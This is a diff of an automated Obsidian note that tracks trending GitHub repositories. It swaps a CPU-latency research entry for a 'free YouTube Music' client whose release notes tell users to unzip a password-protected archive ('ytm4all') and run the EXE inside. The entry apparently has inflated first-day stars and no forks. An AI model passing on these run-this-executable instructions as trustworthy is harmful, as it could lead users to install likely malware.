@@ -1,63 +1,68 @@
 ---
-repo: xoreaxeaxeax/asm-hall-of-shame
-url: https://github.com/xoreaxeaxeax/asm-hall-of-shame
-owner: xoreaxeaxeax
+repo: sohaibdevv/youtube-music
+url: https://github.com/sohaibdevv/youtube-music
+owner: sohaibdevv
 owner_type: User
-language: C
+language: TypeScript
 license: MIT
-description: "Racing to the bottom of CPU performance"
+description: "A lightweight, ad‑free client for streaming music from YouTube Music. No subscription required. Supports background playback, search, and custom playlists via the reverse‑engineered API."
 homepage: ""
-stars: 771
-stars_per_day: 129
-forks: 10
-open_issues: 6
-created: 2026-08-06
-pushed_at: 2026-08-06
-first_seen: 2026-08-10
+stars: 836
+stars_per_day: 836
+forks: 0
+open_issues: 0
+created: 2026-08-11
+pushed_at: 2026-08-11
+first_seen: 2026-08-12
 week: "2026-W33"
 month: "2026-08"
 category: "Other"
 subcategory: ""
-release_tag: ""
+release_tag: "v1.0.0"
 install_complexity: "unknown"
 status: to-review
 my_rating: 0
 score_confidence: 0
 score_interest: 0
 score_risk: 0
-last_reviewed: 2026-08-10
+last_reviewed: 2026-08-12
 use_case: ""
 priority: high
 ring: assess
 discovered_via: "GitHub Trending"
-appearances: 3
-next_review: "2026-08-19"
-contributor_count: 1
+appearances: 1
+next_review: "2026-08-15"
+contributor_count: 2
 engagement: "low"
-issue_close_rate: 0
-repo_size_kb: 241
-readme_length: 5846
+issue_close_rate: -1
+repo_size_kb: 3618
+readme_length: 951
 bus_factor: 1
-last_release_days: -1
-release_cadence: "never"
+last_release_days: 1
+release_cadence: "weekly"
 verdict: ""
-ring_history: "assess@2026-08-10"
-star_history: "2026-08-10:669,2026-08-11:732,2026-08-12:771"
+ring_history: "assess@2026-08-12"
+star_history: "2026-08-12:836"
 tags:
   - github
   - "category/other"
-  - "lang/c"
+  - "lang/typescript"
+  - "topic/ad_free"
+  - "topic/audio_streaming"
+  - "topic/background_playback"
+  - "topic/desktop_app"
+  - "topic/free"
 aliases:
-  - "asm-hall-of-shame"
-  - "xoreaxeaxeax/asm-hall-of-shame"
+  - "youtube-music"
+  - "sohaibdevv/youtube-music"
 ---
 
-# asm-hall-of-shame
+# youtube-music
 
-**669** stars · **167** stars/天 · 建立 4 天前 · C · MIT
+**836** stars · **836** stars/天 · 建立 1 天前 · TypeScript · MIT
 
 ```dataviewjs
-const me = dv.page("Repos/xoreaxeaxeax--asm-hall-of-shame");
+const me = dv.page("Repos/sohaibdevv--youtube-music");
 if (me && ((me.verdict && me.verdict !== "") || (me.my_rating || 0) > 0)) {
   const parts = [];
   if (me.my_rating > 0) parts.push("\u2605".repeat(me.my_rating) + "\u2606".repeat(5 - me.my_rating));
@@ -70,20 +75,22 @@ if (me && ((me.verdict && me.verdict !== "") || (me.my_rating || 0) > 0)) {
 > [!warning] AI 摘要產生失敗
 > 此筆記的中文翻譯和分析未能成功產生。以下為原始資料，你可以手動補充。
 
-`個人專案`
+`v1.0.0`
+
+`ad-free` `audio-streaming` `background-playback` `desktop-app` `free` `music` `music-player` `no-ads` `open-source` `player` `playlist-manager` `streaming` `windows` `youtube` `youtube-music` `yt-music`
 
 > [!summary] 一句話摘要
-> Racing to the bottom of CPU performance
+> A lightweight, ad‑free client for streaming music from YouTube Music. No subscription required. Supports background playback, search, and custom playlists via the reverse‑engineered API.
 
 ## 專案簡介
 
-Racing to the bottom of CPU performance
+A lightweight, ad‑free client for streaming music from YouTube Music. No subscription required. Supports background playback, search, and custom playlists via the reverse‑engineered API.
 
 ## 健康度儀表板
 
 > [!abstract]- 專案健康度綜合評估
 > ```dataviewjs
-> const me = dv.page("Repos/xoreaxeaxeax--asm-hall-of-shame");
+> const me = dv.page("Repos/sohaibdevv--youtube-music");
 > if (me) {
 >   const pushed = me.pushed_at ? new Date(me.pushed_at.toString()) : null;
 >   const daysSincePush = pushed ? Math.floor((Date.now() - pushed.getTime()) / 86400000) : null;
@@ -118,7 +125,7 @@ Racing to the bottom of CPU performance
 
 > [!abstract]- CHAOSS 社群健康度雷達
 > ```dataviewjs
-> const me = dv.page("Repos/xoreaxeaxeax--asm-hall-of-shame");
+> const me = dv.page("Repos/sohaibdevv--youtube-music");
 > if (me) {
 >   const pushed = me.pushed_at ? new Date(me.pushed_at.toString()) : null;
 >   const daysSincePush = pushed ? Math.floor((Date.now() - pushed.getTime()) / 86400000) : 999;
@@ -142,297 +149,132 @@ Racing to the bottom of CPU performance
 
 | 欄位 | 值 |
 | --- | --- |
-| Forks | 6 |
-| Open Issues | 6 |
-| Issue 解決率 | 0% (0 closed) |
-| 最後推送 | 2026-08-06 |
-| 建立日期 | 2026-08-06 |
-| Repo 大小 | 241 KB |
-| OpenSSF Scorecard | [查看](https://scorecard.dev/viewer/?uri=github.com/xoreaxeaxeax/asm-hall-of-shame) |
+| Forks | 0 |
+| Open Issues | 0 |
+| 最後推送 | 2026-08-11 |
+| 建立日期 | 2026-08-11 |
+| Repo 大小 | 3.5 MB |
+| OpenSSF Scorecard | [查看](https://scorecard.dev/viewer/?uri=github.com/sohaibdevv/youtube-music) |
+| Topics | `ad-free` `audio-streaming` `background-playback` `desktop-app` `free` `music` `music-player` `no-ads` |
 
 > [!info]- 語言組成
 > ```mermaid
 > pie title 語言組成
->     "C" : 93
->     "Makefile" : 4
->     "Python" : 3
+>     "TypeScript" : 90
+>     "JavaScript" : 5
+>     "CSS" : 5
 > ```
 
 > [!info]- 主要貢獻者
 > | 貢獻者 | Commits |
 > | --- | --- |
-> | [@xoreaxeaxeax](https://github.com/xoreaxeaxeax) | 1 |
+> | [@sohaibdevv](https://github.com/sohaibdevv) | 7 |
+> | [@github-actions[bot]](https://github.com/github-actions[bot]) | 1 |
+
+**最新版本**：v1.0.0 — youtube-music v1.0.0 (2026-08-11)
+
+> [!info]- Release Notes
+> First public release. Everything works, nothing extra.
+> 
+> 📦 **Inside the archive:**
+> _- youtube-music-free.exe_
+> 🔒 **Password: ytm4all**
+> 
+> 🔥 Features:
+> - Search for tracks, albums, artists
+> - Local playlists (saved locally)
+> - Background playback – music keeps playing when minimized
+> - Media keys support (Play/Pause/Next/Prev)
+> - Dark theme
+> - No ads
+> - No login required
+> - No tracking
+> 
+> ⚡ Just download, unzip with the password, and run the EXE. Works on Windows 10/11.
+> 
+> 📄 License: MIT
+> 
+> Bugs and questions – open an Issue.
 
 ## 開發動態
 
-> [!abstract] 最近 10 次 commit（2026-08-06）
-> **活躍天數** 1 天 · **最新 commit** initial commit
-
-## 熱門議題
-
-> [!question]- 社群最關注的問題
-> | # | Issue | Reactions | Comments |
-> | --- | --- | --- | --- |
-> | [#2](https://github.com/xoreaxeaxeax/asm-hall-of-shame/issues/2) | Project is not called "Assembly Stall of Shame" | 3 | 0 |
-> | [#3](https://github.com/xoreaxeaxeax/asm-hall-of-shame/issues/3) | Rakefield repo link is broken | 0 | 0 |
+> [!abstract] 最近 10 次 commit（2026-08-11 ~ 2026-08-11）
+> **活躍天數** 1 天 · **最新 commit** Update README.md
 
 ## README 摘錄
 
 > [!info]- 展開查看原文 README
-> # Assembly Hall of Shame
+> 🎵 YouTube Music, but free
 > 
-> ## Overview
+>   No ads. No premium. No bullshit.
 > 
-> Instruction latency analysis usually focuses on performance
-> *optimization*—making code run as fast as possible.  The `Assembly Hall of
-> Shame` takes the opposite approach: searching for the absolute floor of
-> single-instruction performance.
-> 
-> ## :trophy: Current Champions :trophy:
-> 
-> ### **x86**: [fxrstor64](#1-trophy-fxrstor64-trophy)
-> 
-> **Strategy**: Use `fxrstor64` to load 512-byte FPU/MMX/XMM state from a
-> high-latency MMIO region in the PCIe fabric, then starve the fabric while the
-> load is in flight — a fleet of hammer cores pounds a different high-latency
-> MMIO register with tight 4-byte reads, saturating the PCIe root complex and
-> endpoint with non-posted transactions, so CPU 0's 512-byte `fxrstor64` must
-> queue behind all that contending traffic.
-> 
-> **Contender**: AMD Ryzen 7 5800H
-> 
-> ```asm
-> ; CPU 0 — timed instruction
-> movl $0xfcc68830, %rsi
-> fxrstor64 %rsi
-> 
-> ; CPUs 1..N — hammer loop against a different high-latency location
-> movl 0xfcc68858, %eax
-> ```
-> 
-> :trophy: **Score**: 198,002,498,236 cycles
-> 
-> :trophy: **Time**: 62 seconds
-> 
-> ## Honorable Mentions
-> 
-> A spec-violating [unaligned ymm0 load](#3-vmovdqu-ymm-unaligned--) that forced
-> non-posted dword transactions from stalled GPU registers was used to break the
-> fundamental design of System Management Mode in
-> [smiiiiiiiiiiiiiiii](https://github.com/xoreaxeaxeax/smiiiiiiiiiiiiiiii).
-> 
-> ```asm
-> vmovdqu 0xfcc003b1, %ymm0
-> ```
-> 
-> ## Rules
-> 
-> * Instructions may use whatever setup is necessary, but only a single
->   instruction is eligible to be scored.
-> * Trapped/emulated/virtualized instructions may only time the trap, not the
->   handler.
-> * Instructions must not be interruptible.  `rep movs`, `pause`, etc. are
->   disqualified.
-> * Times are normalized based on the CPU base clock frequency.
-> * All platforms must be in their factory stock configurations - no hardware
->   modifications.
-> 
-> ## x86 Leaderboard
-> 
-> ### 27. [nop](nop/)
-> 
-> **Strategy**: `nop` does nothing. It opens the leaderboard accordingly.
-> 
-> **Contender**: Intel(R) Core(TM) i7-8559U CPU @ 2.70GHz
-> 
-> ```
-> nop
-> ```
-> 
-> **Score**: 1 cycles
-> 
-> **Time**: 0 nanoseconds
-> 
-> ### 26. [nop16](nop16/)
-> 
-> **Strategy**: Regular `nop` was too short, but how do we make nothing take
-> longer? Try a `lonnnnnng nop`.
-> 
-> **Contender**: Intel(R) Core(TM) i7-8559U CPU @ 2.70GHz
-> 
-> ```
-> data16 data16 data16 data16 data16 data16 data16 nopl 0x00000000(%%eax,%%eax,1)
-> ```
-> 
-> **Score**: 20 cycles
-> 
-> **Time**: 7 nanoseconds
-> 
-> ### 25. [rdtsc](rdtsc/)
-> 
-> **Strategy**: Just a reference instruction to get our bearings.
-> 
-> **Contender**: Intel(R) Core(TM) i7-8559U CPU @ 2.70GHz
-> 
-> ```asm
-> rdtsc
-> ```
-> 
-> **Score**: 49 cycles
-> 
-> **Time**: 18 nanoseconds
-> 
-> ### 24. [idiv](idiv/)
-> 
-> **Strategy**: Use 128-bit dividend (rdx:rax=2:0) with small divisor to push the
-> quotient above the ceiling imposed by sign-extension, driving the longest path
-> through the divider microcode.
-> 
-> **Contender**: Intel(R) Core(TM) i7-8559U CPU @ 2.70GHz
-> 
-> ```asm
-> xorq %rax, %rax   ; rax = 0  (low 64 bits of dividend)
-> movq $2, %rdx     ; rdx = 2  (high 64 bits: full dividend = 2^65)
-> movq $5, %rbx     ; divisor → quotient = 2^65/5 ≈ 7.4×10^18
-> idivq %rbx
-> ```
-> 
-> **Score**: 77 cycles
-> 
-> **Time**: 28 nanoseconds
-> 
-> ### 23. [enter](enter/)
-> 
-> **Strategy**: Use maximum nesting depth (31) to force 30 display-pointer loads
-> and pushes through the microcode display-walk path.
-> 
-> **Contender**: Intel(R) Core(TM) i7-8559U CPU @ 2.70GHz
-> 
-> ```asm
-> enter $0, $31       ; 0 bytes allocated, nesting depth 31 (maximum)
-> ```
-> 
-> **Score**: 112 cycles
-> 
-> **Time**: 41 nanoseconds
-> 
-> ### 22. [fldl](fldl/)
-> 
-> **Strategy**: Try a small denormal to trigger an FP microcode assist.
-> 
-> **Contender**: Intel(R) Core(TM) i7-8559U CPU @ 2.70GHz
-> 
-> ```asm
->     movabsq $0x0000000000000001, %rax
->     movq    %rax, -8(%rsp)
->     fldl    -8(%rsp)
-> ```
-> 
-> **Score**: 133 cycles
-> 
-> **Time**: 49 nanoseconds
-> 
-> ### 21. [clflush](clflush/)
-> 
-> **Strategy**: Just ensure the cache line is dirty.
-> 
-> **Contender**: Intel(R) Core(TM) i7-8559U CPU @ 2.70GHz
-> 
-> ```asm
-> clflush (%rax)          ; rax -> dirty cache line resident in L3
-> ```
-> 
-> **Score**: 165 cycles
-> 
-> **Time**: 60 nanoseconds
-> 
-> ### 20. [fsin](fsin/)
-> 
-> **Strategy**: Use exponent 0x7ff to reach 'special value' processing in
-> microcode; positive/negative, NaN/inf doesn't seem to make a difference, go with
-> QNaN.
-> 
-> **Contender**: Intel(R) Core(TM) i7-8559U CPU @ 2.70GHz
-> 
-> ```asm
->     movabsq $0x7fffffffffffffff, %rax
->     movq    %rax, -8(%rsp)
->     fldl    -8(%rsp)
->     fsin
-> ```
-> 
-> **Score**: 257 cycles
-> 
-> **Time**: 94 nanoseconds
-> 
-> ### 19. [mfence](mfence/)
-> 
-> **Strategy**: Saturate all write-combining line-fill buffers with `movnti`
-> stores to distinct cache lines, forcing `mfence` to drain the full LFB write
-> path to the uncore before retiring.
-> 
-> **Contender**: Intel(R) Core(TM) i7-8559U CPU @ 2.70GHz
-> 
-> ```asm
-> movnti %r9,  0*64(%rdi)   ; ×16 distinct cache lines — saturate the write-combining LFBs
-> ; …
-> movnti %r9, 15*64(%rdi)
-> mfence                     ; must drain all pending LFB writes before retiring
-> ```
-> 
-> **Score**: 326 cycles
-> 
-> **Time**: 120 nanoseconds
-> 
-> ### 18. [mov cr3](mov_cr3/)
-> 
-> **Strategy**: Nothing for now, just check how long it takes to invalidate the
-> TLB.
-> 
-> **Contender**: AMD Ryzen 7 5800H with Radeon Graphics (Trigkey S5)
-> 
-> ```asm
-> mov %rax, %cr3
-> ```
-> 
-> **Score**: 352 cycles
-> 
-> **Time**: 110 nanoseconds
-> 
-> ### 17. [fadd](denormal/)
-> 
-> **Strategy**: Hit x87 FP microcode assist path by using denormal source operand.
-> 
-> **Contender**: Intel(R) Core(TM) i7-8559U CPU @ 2.70GHz
-> 
-> ```asm
-> fldl   subnorm    ; 1e-310: value 
-> 1,000,000,000,000 cycles
-> 
-> **Contender**: TODO
-> 
-> ```asm
-> ; XCR0 must enable AMX components (bits 17-18); state area ~8KB
-> xrstor64 (%rsi)         ; rsi -> MMIO region, same technique as fxrstor64
-> ```
-> 
-> ## ARM Leaderboard
-> 
-> * T.B.D.
-> 
-> ## RISC-V Leaderboard
-> 
-> * T.B.D.
 >   
-> ## Author
+>     
+>   
+>   
+>     
+>   
+>   
+>     
+>   
+>   
+>     
+>   
 > 
-> The assembly hall-of-shame is a research effort from Christopher Domas ([@xoreaxeaxeax](https://x.com/xoreaxeaxeax/)).
+> ---
+> 
+> ## ✨ Features
+> 
+> |  |  |
+> | --- | --- |
+> | 🚫 **No ads** | Uninterrupted listening |
+> | 🔄 **Background playback** | Music keeps playing when minimized |
+> | 🔍 **Search** | Find tracks, artists, albums instantly |
+> | 📂 **Local playlists** | Save queues – no tracking |
+> | 🌙 **Dark theme** | Auto or manual |
+> | ⌨️ **Media keys** | Play/Pause, Next, Previous |
+> | 📦 **Portable** | Single EXE – no install |
+> 
+> ---
+> 
+> ## 📦 Download
+> 
+>   
+>     
+>   
+>   
+> 🔐 Password:  ytm4all
+> 
+> ---
+> 
+> ## 🚀 How to use
+> 
+> 1. ⬇️ Download the ZIP  
+> 2. 🔓 Unzip with password `ytm4all`  
+> 3. 🖱️ Run **`youtube-music-free.exe`**  
+> 4. 🔎 Search and play
+> 
+> No install, no registry, no leftovers.
+> 
+> ---
+> 
+> ## ⚠️ Disclaimer
+> 
+> Not affiliated with Google. All rights belong to owners. Streams audio like a browser – no downloading, no DRM bypass. Use responsibly.
+> 
+> ---
+> 
+> ## 📄 License
+> 
+> MIT
+> 
+> ---
 
 ## 延伸閱讀
 
-相關專案：[[0xwilliamortiz--claude-red|0xwilliamortiz/claude-red]] · [[0xwilliamortiz--openclaude-improved|0xwilliamortiz/openclaude-improved]] · [[0xwilliamortiz--ponytail-improved|0xwilliamortiz/ponytail-improved]] · [[Accio-org--RealReplicaBench|Accio-org/RealReplicaBench]] · [[Binaryify--open-kimi-ppt-skill|Binaryify/open-kimi-ppt-skill]] · [[DannyMac180--sol-advisor|DannyMac180/sol-advisor]] · [[DramaticShape--DramaticShapeVoxelMod|DramaticShape/DramaticShapeVoxelMod]] · [[FareedKhan-dev--kimi-k3-in-c|FareedKhan-dev/kimi-k3-in-c]]
+相關專案：[[0xwilliamortiz--claude-red|0xwilliamortiz/claude-red]] · [[0xwilliamortiz--openclaude-improved|0xwilliamortiz/openclaude-improved]] · [[0xwilliamortiz--ponytail-improved|0xwilliamortiz/ponytail-improved]]
 
-[GitHub](https://github.com/xoreaxeaxeax/asm-hall-of-shame)
+[GitHub](https://github.com/sohaibdevv/youtube-music)
 
 ## 相關收錄
 
@@ -440,7 +282,7 @@ Racing to the bottom of CPU performance
 > ```dataview
 > TABLE stars, install_complexity AS "難度", status
 > FROM "Repos"
-> WHERE category = "Other" AND file.name != "xoreaxeaxeax--asm-hall-of-shame"
+> WHERE category = "Other" AND file.name != "sohaibdevv--youtube-music"
 > SORT stars DESC
 > LIMIT 8
 > ```
@@ -449,7 +291,7 @@ Racing to the bottom of CPU performance
 > ```dataview
 > TABLE stars_per_day AS "Stars/天", category AS "分類", use_case AS "用途"
 > FROM "Repos"
-> WHERE language = "C" AND file.name != "xoreaxeaxeax--asm-hall-of-shame" AND status != "archived"
+> WHERE language = "TypeScript" AND file.name != "sohaibdevv--youtube-music" AND status != "archived"
 > SORT stars_per_day DESC
 > LIMIT 5
 > ```
@@ -458,18 +300,18 @@ Racing to the bottom of CPU performance
 > ```dataview
 > TABLE category AS "分類", stars, stars_per_day AS "stars/天"
 > FROM "Repos"
-> WHERE week = "2026-W33" AND file.name != "xoreaxeaxeax--asm-hall-of-shame"
+> WHERE week = "2026-W33" AND file.name != "sohaibdevv--youtube-music"
 > SORT stars DESC
 > ```
 
 > [!note]- Ring 更高的同類競品
 > ```dataviewjs
-> const me = dv.page("Repos/xoreaxeaxeax--asm-hall-of-shame");
+> const me = dv.page("Repos/sohaibdevv--youtube-music");
 > if (me) {
 >   const ringOrder = { hold: 0, assess: 1, trial: 2, adopt: 3 };
 >   const myRing = ringOrder[me.ring] || 0;
 >   const better = dv.pages('"Repos"')
->     .where(p => p.file.name !== "xoreaxeaxeax--asm-hall-of-shame" && p.category === me.category && (ringOrder[p.ring] || 0) > myRing)
+>     .where(p => p.file.name !== "sohaibdevv--youtube-music" && p.category === me.category && (ringOrder[p.ring] || 0) > myRing)
 >     .sort(p => p.stars_per_day || 0, "desc").limit(5);
 >   if (better.length > 0) {
 >     dv.table(["專案", "Ring", "Stars/天", "安裝", "用途"], better.map(p => [
@@ -485,7 +327,7 @@ Racing to the bottom of CPU performance
 > ```dataview
 > TABLE stars AS "Stars", category AS "分類", status AS "狀態"
 > FROM "Repos"
-> WHERE owner = "xoreaxeaxeax" AND file.name != "xoreaxeaxeax--asm-hall-of-shame"
+> WHERE owner = "sohaibdevv" AND file.name != "sohaibdevv--youtube-music"
 > SORT stars DESC
 > ```
 
@@ -493,7 +335,7 @@ Racing to the bottom of CPU performance
 
 > [!abstract]- 這個專案在 vault 中的相對位置
 > ```dataviewjs
-> const me = dv.page("Repos/xoreaxeaxeax--asm-hall-of-shame");
+> const me = dv.page("Repos/sohaibdevv--youtube-music");
 > const all = dv.pages('"Repos"').where(p => p.status !== "archived").sort(p => p.stars_per_day || 0, "desc");
 > const rank = all.array().findIndex(p => p.file.name === me?.file?.name) + 1;
 > const catAll = all.where(p => p.category === me?.category);
@@ -510,7 +352,7 @@ Racing to the bottom of CPU performance
 
 > [!abstract]- Stars 成長追蹤
 > ```dataviewjs
-> const me = dv.page("Repos/xoreaxeaxeax--asm-hall-of-shame");
+> const me = dv.page("Repos/sohaibdevv--youtube-music");
 > if (me?.star_history) {
 >   const raw = me.star_history.toString();
 >   const points = raw.split(",").map(p => { const [d, s] = p.split(":"); return { date: d, stars: parseInt(s) }; }).filter(p => !isNaN(p.stars));
@@ -543,7 +385,7 @@ Racing to the bottom of CPU performance
 
 > [!abstract]- 跟 vault 中同類專案比較
 > ```dataviewjs
-> const me = dv.page("Repos/xoreaxeaxeax--asm-hall-of-shame");
+> const me = dv.page("Repos/sohaibdevv--youtube-music");
 > if (me) {
 >   const all = dv.pages('"Repos"').where(p => p.status !== "archived");
 >   const sameCat = all.where(p => p.category === me.category);
@@ -567,7 +409,7 @@ Racing to the bottom of CPU performance
 
 > [!abstract]- 綜合評估（自動計算）
 > ```dataviewjs
-> const me = dv.page("Repos/xoreaxeaxeax--asm-hall-of-shame");
+> const me = dv.page("Repos/sohaibdevv--youtube-music");
 > if (me) {
 >   let score = 0;
 >   let breakdown = [];
@@ -604,7 +446,7 @@ Racing to the bottom of CPU performance
 
 > [!abstract]- 評估進度
 > ```dataviewjs
-> const me = dv.page("Repos/xoreaxeaxeax--asm-hall-of-shame");
+> const me = dv.page("Repos/sohaibdevv--youtube-music");
 > if (me) {
 >   const steps = [
 >     { name: "已讀", done: me.status && me.status !== "to-review" },
@@ -687,7 +529,7 @@ Racing to the bottom of CPU performance
 
 _按時間記錄，每次接觸時追加一段（最新在上）_
 
-> **2026-08-10** — 首次收錄
+> **2026-08-12** — 首次收錄
 > _第一印象：_
 
 **狀態追蹤**：`to-review` → `reading` → `tried` → `integrated` / `archived`
@@ -703,6 +545,4 @@ _按時間記錄，每次接觸時追加一段（最新在上）_
 
 ## 出現記錄
 
-- [[2026-08-12|2026-08-12]] — 再次上榜，771 stars
-- [[2026-08-11|2026-08-11]] — 再次上榜，732 stars
-- [[2026-08-10|2026-08-10]] — 首次收錄，669 stars
+- [[2026-08-12|2026-08-12]] — 首次收錄，836 stars
